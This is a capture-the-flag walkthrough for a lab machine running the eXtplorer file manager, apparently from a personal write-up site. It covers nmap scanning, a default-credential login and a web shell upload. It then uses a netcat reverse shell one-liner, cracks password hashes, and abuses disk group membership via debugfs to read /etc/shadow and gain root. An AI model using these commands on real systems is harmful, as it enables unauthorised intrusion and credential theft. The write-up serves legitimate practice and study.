---
layout: default
title: Extplorer
parent: Proving Grounds Practice - Linux
nav_order: 17
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/extplorer]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.180.16

Nmap scan report for 192.168.180.16
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

# Enumeration

---

## 80 | HTTP

Gobuster reveals _/filemanager_

![filemanager](../../../assets/images/ctfs/proving_grounds/extplorer/filemanager.png)

The default username and password _admin:admin_ authenticates.

We have the ability to write files to the _/filemanager_ path and create a cmd.php web shell.

![cmd](../../../assets/images/ctfs/proving_grounds/extplorer/cmd.png)

# Exploitation

---

We have command execution with the cmd.php web shell.

![id](../../../assets/images/ctfs/proving_grounds/extplorer/id.png)

Generate a nc-mknod oneliner and url encode.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/extplorer]
└─$ revshellgen -i 192.168.45.217 -p 9001 -t nc-mknod

[+] Reverse shell command:

rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.217 9001 1>/tmp/l

```

Executing the urlencoded payload we get a reverse shell.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/extplorer]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.180.16] 33484
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# Post-Exploitation

---

## Enumerate Dora Hash from .htusers.php

www-data@dora:/var/www/html/filemanager/config$ cat .htusers.php
cat .htusers.php

<?php 
        // ensure this file is being included by a parent file
        if( !defined( '_JEXEC' ) && !defined( '_VALID_MOS' ) ) die( 'Restricted access' );
        $GLOBALS["users"]=array(
        array('admin','21232f297a57a5a743894a0e4a801fc3','/var/www/html','http://localhost','1','','7',1),
        array('dora','$2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS','/var/www/html','http://localhost','1','','0',1),
); 

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/extplorer]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 256 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
doraemon         (?)     
1g 0:00:00:02 DONE (2023-12-06 22:22) 0.4219g/s 637.9p/s 637.9c/s 637.9C/s love22..something
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

## Pivot to Dora

```bash
www-data@dora:/bin$ su dora                                                                             
su dora                                                                                                 
Password: doraemon                                                                                      
                                                                                                        
$ id                                                                                                    
id                                                                                                      
uid=1000(dora) gid=1000(dora) groups=1000(dora),6(disk) 
```

## Abuse Disk Group Membership

Since Dora belongs to the *Disk* group we can abuse this group membership to get a root shell.

Here is a good writeup on how this works.

[Disc Group Privilege Escalation](https://vk9-sec.com/disk-group-privilege-escalation/)

If we execute *df -h* we can find the partition that root directory */* is mounted

```bash
dora@dora:~$ df -h
df -h
Filesystem                         Size  Used Avail Use% Mounted on
/dev/mapper/ubuntu--vg-ubuntu--lv  9.8G  5.2G  4.1G  56% /
udev                               947M     0  947M   0% /dev
tmpfs                              992M     0  992M   0% /dev/shm
tmpfs                              199M  1.2M  198M   1% /run
tmpfs                              5.0M     0  5.0M   0% /run/lock
tmpfs                              992M     0  992M   0% /sys/fs/cgroup
/dev/sda2                          1.7G  209M  1.4G  13% /boot
/dev/loop0                          62M   62M     0 100% /snap/core20/1611
/dev/loop3                          50M   50M     0 100% /snap/snapd/18596
/dev/loop2                          68M   68M     0 100% /snap/lxd/22753
/dev/loop1                          64M   64M     0 100% /snap/core20/1852
/dev/loop4                          92M   92M     0 100% /snap/lxd/24061
tmpfs                              199M     0  199M   0% /run/user/1000

```

We want to use *debugfs* to enumerate the root directory.

```bash
dora@dora:~$ debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
debugfs 1.45.5 (07-Jan-2020)

```

This will allow us to read */etc/shadow*

```bash
debugfs:  cat /etc/shadow
cat /etc/shadow
root:$6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.:19453:0:99999:7:::

```

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/extplorer]
└─$ vim root_hash

# Add the root hash to the root_hash file
$6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.

# Crack with John
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/extplorer]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt root_hash

Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])

explorer         (?)     

1g 0:00:00:01 DONE (2023-12-06 22:35) 0.5714g/s 1865p/s 1865c/s 1865C/s adriano..jeter2
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

We have cracked the root hash and have the password to elevate privileges.

```bash
dora@dora:~$ su root
su root
Password: explorer

root@dora:/home/dora# whoami
whoami
root

```
